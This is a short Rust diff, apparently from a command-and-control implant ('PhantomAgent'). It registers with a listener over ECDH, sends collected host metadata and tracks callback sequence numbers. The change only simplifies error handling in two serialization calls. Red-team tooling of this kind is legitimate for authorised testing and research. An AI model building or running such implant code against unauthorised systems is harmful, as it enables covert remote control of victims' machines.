@@ -78,8 +78,7 @@ impl PhantomAgent {
         let listener_pub_key = decode_listener_pub_key(key_str)?;
 
         let metadata = self.collect_metadata();
-        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)
-            .map_err(|e| PhantomError::Transport(format!("ECDH metadata encode: {e}")))?;
+        let metadata_bytes = serialize_init_metadata(self.agent_id, &metadata)?;
 
         let session = perform_registration(&self.transport, &listener_pub_key, &metadata_bytes)
             .await
@@ -100,9 +99,7 @@ impl PhantomAgent {
             .as_ref()
             .ok_or_else(|| PhantomError::Transport("ECDH session not initialized".into()))
             .map(|s| (s.connection_id, s.session_key, s.agent_id))?;
-        let msg_bytes = DemonMessage::new(packages)
-            .to_bytes()
-            .map_err(|e| PhantomError::Transport(format!("ECDH message encode: {e}")))?;
+        let msg_bytes = DemonMessage::new(packages).to_bytes()?;
 
         // seq_num(8 LE) | DemonMessage — server rejects packets with seq ≤ last seen.
         let seq = self.callback_seq;
